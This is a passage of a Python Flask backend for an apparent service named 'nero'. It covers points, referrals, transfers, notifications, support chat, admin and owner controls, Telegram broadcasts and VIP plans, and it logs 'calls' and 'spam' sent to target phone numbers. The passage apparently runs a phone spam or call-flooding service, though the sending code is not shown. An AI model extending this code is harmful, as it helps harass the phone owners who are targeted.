        return jsonify({"error": "لا تملك نقاط كافية"}), 400
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('''UPDATE users SET extra_tokens = extra_tokens + 1,
                     extra_tokens_expiry = ? WHERE user_id = ?''',
                  ((datetime.now() + timedelta(days=30)).strftime('%Y-%m-%d %H:%M:%S'), uid))
        c.execute('UPDATE users SET points = points - 1 WHERE user_id = ?', (uid,))
        conn.commit()
        conn.close()
    return jsonify({"ok": True,
                    "points": get_user_points(uid),
                    "extra_tokens": get_extra_tokens(uid)})


@app.route('/api/referral')
@login_required
def api_referral():
    uid = session['user_id']
    code = get_referral_code(uid)
    clicks, registered = get_referral_stats(uid)
    return jsonify({
        "code": code,
        "link": f"/?ref={code}",
        "points": get_user_points(uid),
        "referrals": get_referral_count(uid),
        "clicks": clicks,
        "registered": registered,
    })


@app.route('/api/history')
@login_required
def api_history():
    uid = session['user_id']
    try:
        limit = min(int(request.args.get('limit', 30)), 100)
    except Exception:
        limit = 30
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('''SELECT 'call' AS kind, id, phone AS target, status,
                            call_time AS ts, response AS extra
                     FROM calls_log WHERE user_id = ?
                     UNION ALL
                     SELECT 'spam' AS kind, id, phone AS target, status,
                            spam_time AS ts, (service || ' x' || count) AS extra
                     FROM spam_log WHERE user_id = ?
                     UNION ALL
                     SELECT 'transfer_in' AS kind, id, CAST(from_user AS TEXT) AS target,
                            status, created_at AS ts, (amount || ' نقطة') AS extra
                     FROM transfer_requests WHERE to_user = ?
                     UNION ALL
                     SELECT 'transfer_out' AS kind, id, CAST(to_user AS TEXT) AS target,
                            status, created_at AS ts, (amount || ' نقطة') AS extra
                     FROM transfer_requests WHERE from_user = ?
                     ORDER BY ts DESC LIMIT ?''',
                  (uid, uid, uid, uid, limit))
        rows = c.fetchall()
        conn.close()
    items = []
    for r in rows:
        items.append({
            "kind": r[0], "id": r[1], "target": r[2],
            "status": r[3], "time": r[4], "extra": r[5]
        })
    return jsonify({"items": items})


@app.route('/api/transfer', methods=['POST'])
@login_required
def api_transfer():
    uid = session['user_id']
    data = request.get_json() or {}
    try:
        to_user = int(data.get('to_user', 0))
        amount = int(data.get('amount', 0))
    except Exception:
        return jsonify({"error": "بيانات غير صحيحة"}), 400
    service = data.get('service', 'call')
    if to_user <= 0 or to_user == uid:
        return jsonify({"error": "معرّف المستلم غير صحيح"}), 400
    if amount < 1:
        return jsonify({"error": "الحد الأدنى نقطة واحدة"}), 400
    if get_user_points(uid) < amount:
        return jsonify({"error": "رصيدك غير كافٍ"}), 400
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('''INSERT INTO transfer_requests (from_user, to_user, amount, service, status, created_at)
                     VALUES (?, ?, ?, ?, 'pending', ?)''',
                  (uid, to_user, amount, service, datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
        req_id = c.lastrowid
        conn.commit()
        conn.close()
    add_notification(to_user, "🔄", "طلب تحويل نقاط جديد",
                     f"من {uid} بقيمة {amount} نقطة")
    return jsonify({"ok": True, "request_id": req_id,
                    "message": f"تم إرسال الطلب إلى {to_user} بقيمة {amount} نقطة"})


@app.route('/api/transfer/incoming')
@login_required
def api_transfer_incoming():
    uid = session['user_id']
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute("SELECT id, from_user, amount, service FROM transfer_requests WHERE to_user = ? AND status = 'pending'",
                  (uid,))
        rows = c.fetchall()
        conn.close()
    return jsonify({"requests": [
        {"id": r[0], "from_user": r[1], "amount": r[2], "service": r[3]} for r in rows
    ]})


@app.route('/api/transfer/<int:req_id>/<action>', methods=['POST'])
@login_required
def api_transfer_action(req_id, action):
    uid = session['user_id']
    if action not in ('accept', 'reject'):
        return jsonify({"error": "إجراء غير صحيح"}), 400
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('SELECT from_user, to_user, amount, status FROM transfer_requests WHERE id = ?', (req_id,))
        r = c.fetchone()
        if not r or r[1] != uid or r[3] != 'pending':
            conn.close()
            return jsonify({"error": "الطلب غير موجود أو معالج"}), 400
        from_user, to_user, amount, _ = r
        if action == 'accept':
            if get_user_points(from_user) < amount:
                conn.close()
                return jsonify({"error": "المرسل لا يملك رصيداً كافياً"}), 400
            c.execute('UPDATE users SET points = points - ? WHERE user_id = ?', (amount, from_user))
            c.execute('UPDATE users SET points = points + ? WHERE user_id = ?', (amount, to_user))
            c.execute("UPDATE transfer_requests SET status = 'accepted' WHERE id = ?", (req_id,))
        else:
            c.execute("UPDATE transfer_requests SET status = 'rejected' WHERE id = ?", (req_id,))
        conn.commit()
        conn.close()
    if action == 'accept':
        add_notification(from_user, "✅", "تم قبول تحويلك", f"{to_user} استلم {amount} نقطة")
    else:
        add_notification(from_user, "❌", "تم رفض تحويلك", f"{to_user} رفض {amount} نقطة")
    return jsonify({"ok": True, "action": action})


@app.route('/api/notifications')
@login_required
def api_notifications():
    uid = session['user_id']
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('''SELECT id, icon, title, body, created_at, read
                     FROM notifications WHERE user_id = ?
                     ORDER BY id DESC LIMIT 50''', (uid,))
        rows = c.fetchall()
        conn.close()
    return jsonify({"items": [
        {"id": r[0], "icon": r[1], "title": r[2], "body": r[3],
         "time": r[4], "read": bool(r[5])} for r in rows
    ]})


@app.route('/api/notifications/read', methods=['POST'])
@login_required
def api_notifications_read():
    uid = session['user_id']
    data = request.get_json() or {}
    notif_id = data.get('id')
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        if notif_id:
            c.execute('UPDATE notifications SET read = 1 WHERE id = ? AND user_id = ?', (notif_id, uid))
        else:
            c.execute('UPDATE notifications SET read = 1 WHERE user_id = ?', (uid,))
        conn.commit()
        conn.close()
    return jsonify({"ok": True})


@app.route('/api/support/messages')
@login_required
def api_support_messages():
    uid = session['user_id']
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('''SELECT id, from_admin, message, created_at
                     FROM support_messages WHERE user_id = ?
                     ORDER BY id ASC LIMIT 200''', (uid,))
        rows = c.fetchall()
        c.execute('UPDATE support_messages SET read_by_user = 1 WHERE user_id = ? AND from_admin = 1', (uid,))
        conn.commit()
        conn.close()
    return jsonify({"items": [
        {"id": r[0], "from_admin": bool(r[1]), "message": r[2], "time": r[3]}
        for r in rows
    ]})


@app.route('/api/support/send', methods=['POST'])
@login_required
def api_support_send():
    uid = session['user_id']
    data = request.get_json() or {}
    msg = (data.get('message') or '').strip()
    if not msg:
        return jsonify({"error": "الرسالة فارغة"}), 400
    if len(msg) > 2000:
        msg = msg[:2000]
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('''INSERT INTO support_messages (user_id, from_admin, message, created_at, read_by_user)
                     VALUES (?, 0, ?, ?, 1)''',
                  (uid, msg, datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
        conn.commit()
        conn.close()
    return jsonify({"ok": True})


@app.route('/api/stats/public')
def api_public_stats():
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM users')
        users = c.fetchone()[0]
        c.execute('SELECT SUM(total_calls) FROM daily_stats')
        calls = c.fetchone()[0] or 0
        c.execute('SELECT SUM(total_spam) FROM daily_stats')
        spam = c.fetchone()[0] or 0
        conn.close()
    return jsonify({"users": users, "calls": calls, "spam": spam})


@app.route('/api/admin/stats')
@admin_required
def api_admin_stats():
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM users')
        total = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM users WHERE is_vip = 1')
        vip = c.fetchone()[0]
        c.execute('SELECT SUM(total_calls) FROM daily_stats')
        calls = c.fetchone()[0] or 0
        c.execute('SELECT SUM(total_spam) FROM daily_stats')
        spam = c.fetchone()[0] or 0
        c.execute('SELECT SUM(points) FROM users')
        points = c.fetchone()[0] or 0
        c.execute('SELECT SUM(referral_count) FROM users')
        refs = c.fetchone()[0] or 0
        today = datetime.now().strftime('%Y-%m-%d')
        c.execute('SELECT total_calls, total_spam FROM daily_stats WHERE date = ?', (today,))
        t = c.fetchone()
        conn.close()
    return jsonify({
        "users": total, "vip": vip, "calls": calls, "spam": spam,
        "points": points, "referrals": refs,
        "today_calls": t[0] if t else 0,
        "today_spam": t[1] if t else 0,
    })


@app.route('/api/admin/add_points', methods=['POST'])
@admin_required
def api_admin_add_points():
    data = request.get_json() or {}
    try:
        target = int(data.get('user_id'))
        amount = int(data.get('amount'))
    except Exception:
        return jsonify({"error": "بيانات غير صحيحة"}), 400
    update_user_points(target, amount)
    if amount > 0:
        add_notification(target, "💎", "تمت إضافة نقاط", f"+{amount} نقطة إلى رصيدك")
    return jsonify({"ok": True, "points": get_user_points(target)})


@app.route('/api/admin/add_vip', methods=['POST'])
@admin_required
def api_admin_add_vip():
    data = request.get_json() or {}
    try:
        target = int(data.get('user_id'))
        days = int(data.get('days'))
    except Exception:
        return jsonify({"error": "بيانات غير صحيحة"}), 400
    expiry = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('UPDATE users SET is_vip = 1, vip_expiry = ? WHERE user_id = ?', (expiry, target))
        conn.commit()
        conn.close()
    add_notification(target, "👑", "تم تفعيل VIP", f"حتى {expiry}")
    return jsonify({"ok": True, "expiry": expiry})


@app.route('/api/admin/broadcast', methods=['POST'])
@admin_required
def api_admin_broadcast():
    data = request.get_json() or {}
    message = (data.get('message') or '').strip()
    target_type = data.get('target', 'all')
    target_user = data.get('user_id')
    if not message:
        return jsonify({"error": "الرسالة فارغة"}), 400

    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        if target_type == 'all':
            c.execute('SELECT user_id FROM users')
            c.execute('INSERT INTO broadcasts (target_user_id, message, created_at) VALUES (NULL, ?, ?)',
                      (message, datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
        elif target_type == 'vip':
            c.execute('SELECT user_id FROM users WHERE is_vip = 1')
            c.execute('INSERT INTO broadcasts (target_user_id, message, created_at) VALUES (NULL, ?, ?)',
                      (message, datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
        else:
            try:
                tu = int(target_user)
            except Exception:
                conn.close()
                return jsonify({"error": "معرّف المستخدم غير صحيح"}), 400
            c.execute('SELECT user_id FROM users WHERE user_id = ?', (tu,))
            c.execute('INSERT INTO broadcasts (target_user_id, message, created_at) VALUES (?, ?, ?)',
                      (tu, message, datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
        recipients = [r[0] for r in c.fetchall()]
        conn.commit()
        conn.close()

    for uid in recipients:
        add_notification(uid, "📢", "رسالة إدارية", message)

    sent = 0
    if TOKEN and TOKEN != "YOUR_TOKEN_HERE":
        for uid in recipients:
            try:
                r = requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                                  json={"chat_id": uid, "text": message}, timeout=5)
                if r.ok:
                    sent += 1
            except Exception:
                pass
    return jsonify({"ok": True, "recipients": len(recipients), "sent_telegram": sent})


@app.route('/api/admin/support/reply', methods=['POST'])
@admin_required
def api_admin_support_reply():
    data = request.get_json() or {}
    try:
        target = int(data.get('user_id'))
    except Exception:
        return jsonify({"error": "معرّف غير صحيح"}), 400
    msg = (data.get('message') or '').strip()
    if not msg:
        return jsonify({"error": "الرسالة فارغة"}), 400
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('''INSERT INTO support_messages (user_id, from_admin, message, created_at, read_by_user)
                     VALUES (?, 1, ?, ?, 0)''',
                  (target, msg[:2000], datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
        conn.commit()
        conn.close()
    add_notification(target, "💬", "رد من الدعم", msg[:80])
    return jsonify({"ok": True})


@app.route('/api/admin/support/inbox')
@admin_required
def api_admin_support_inbox():
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('''SELECT user_id, MAX(created_at) AS last_time, COUNT(*) AS cnt
                     FROM support_messages WHERE from_admin = 0
                     GROUP BY user_id ORDER BY last_time DESC LIMIT 50''')
        rows = c.fetchall()
        conn.close()
    return jsonify({"threads": [
        {"user_id": r[0], "last_time": r[1], "count": r[2]} for r in rows
    ]})


@app.route('/api/owner/status')
@owner_required
def api_owner_status():
    btns = get_buttons_status()
    limits = {s: int(get_setting(f"limit_{s}", DEFAULT_LIMITS[s])) for s in DEFAULT_LIMITS}
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('SELECT channel_username FROM force_channels')
        channels = [r[0] for r in c.fetchall()]
        c.execute('SELECT user_id FROM users WHERE is_admin = 1')
        admins = [r[0] for r in c.fetchall()]
        conn.close()
    return jsonify({"buttons": btns, "limits": limits, "channels": channels, "admins": admins})


@app.route('/api/owner/toggle/<service>', methods=['POST'])
@owner_required
def api_owner_toggle(service):
    if service not in BUTTONS_DEFAULT:
        return jsonify({"error": "خدمة غير صحيحة"}), 400
    current = get_setting(f"btn_{service}", "1") == "1"
    set_setting(f"btn_{service}", "1" if not current else "0")
    return jsonify({"ok": True, "enabled": not current})


@app.route('/api/owner/set_limit', methods=['POST'])
@owner_required
def api_owner_set_limit():
    data = request.get_json() or {}
    service = data.get('service')
    try:
        limit = int(data.get('limit'))
    except Exception:
        return jsonify({"error": "الحد غير صحيح"}), 400
    if service not in DEFAULT_LIMITS:
        return jsonify({"error": "خدمة غير صحيحة"}), 400
    set_setting(f"limit_{service}", str(limit))
    return jsonify({"ok": True, "limit": limit})


@app.route('/api/owner/add_admin', methods=['POST'])
@owner_required
def api_owner_add_admin():
    data = request.get_json() or {}
    try:
        target = int(data.get('user_id'))
    except Exception:
        return jsonify({"error": "معرّف غير صحيح"}), 400
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('UPDATE users SET is_admin = 1 WHERE user_id = ?', (target,))
        conn.commit()
        conn.close()
    add_notification(target, "🛡️", "تم رفعك أدمن")
    return jsonify({"ok": True})


@app.route('/api/owner/remove_admin', methods=['POST'])
@owner_required
def api_owner_remove_admin():
    data = request.get_json() or {}
    try:
        target = int(data.get('user_id'))
    except Exception:
        return jsonify({"error": "معرّف غير صحيح"}), 400
    if target in OWNER_IDS:
        return jsonify({"error": "لا يمكن تنزيل المالك"}), 400
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('UPDATE users SET is_admin = 0 WHERE user_id = ?', (target,))
        conn.commit()
        conn.close()
    return jsonify({"ok": True})


@app.route('/api/owner/add_channel', methods=['POST'])
@owner_required
def api_owner_add_channel():
    data = request.get_json() or {}
    username = (data.get('username') or '').strip().replace('@', '')
    if not username:
        return jsonify({"error": "أرسل معرف القناة"}), 400
    channel_id = username
    if TOKEN and TOKEN != "YOUR_TOKEN_HERE":
        try:
            r = requests.get(f"https://api.telegram.org/bot{TOKEN}/getChat",
                             params={"chat_id": f"@{username}"}, timeout=5)
            j = r.json()
            if j.get('ok'):
                channel_id = str(j['result']['id'])
            else:
                return jsonify({"error": f"تعذّر الوصول للقناة: {j.get('description')}"}), 400
        except Exception as e:
            return jsonify({"error": f"خطأ: {str(e)[:80]}"}), 400
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('INSERT OR REPLACE INTO force_channels (channel_id, channel_username) VALUES (?, ?)',
                  (channel_id, username))
        conn.commit()
        conn.close()
    return jsonify({"ok": True, "username": username})


@app.route('/api/owner/remove_channel', methods=['POST'])
@owner_required
def api_owner_remove_channel():
    data = request.get_json() or {}
    username = (data.get('username') or '').strip().replace('@', '')
    with db_lock:
        conn = get_conn()
        c = conn.cursor()
        c.execute('DELETE FROM force_channels WHERE channel_username = ?', (username,))
        conn.commit()
        conn.close()
    return jsonify({"ok": True})


@app.route('/api/vip')
@login_required
def api_vip():
    return jsonify({
        "payment_username": PAYMENT_USERNAME,
        "plans": [
            {"days": 1, "price": 1},
            {"days": 3, "price": 3},
            {"days": 7, "price": 6},
            {"days": 30, "price": 20},
        ],
        "is_vip": is_vip(session['user_id'])
    })


if __name__ == '__main__':
    reset_daily_limits()
    print("=" * 60)
    print("🌐 موقع nero - يعمل الآن")
    print(f"📍 افتح المتصفح على: http://localhost:{os.environ.get('PORT', 5000)}")
    print("=" * 60)
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False, threaded=True)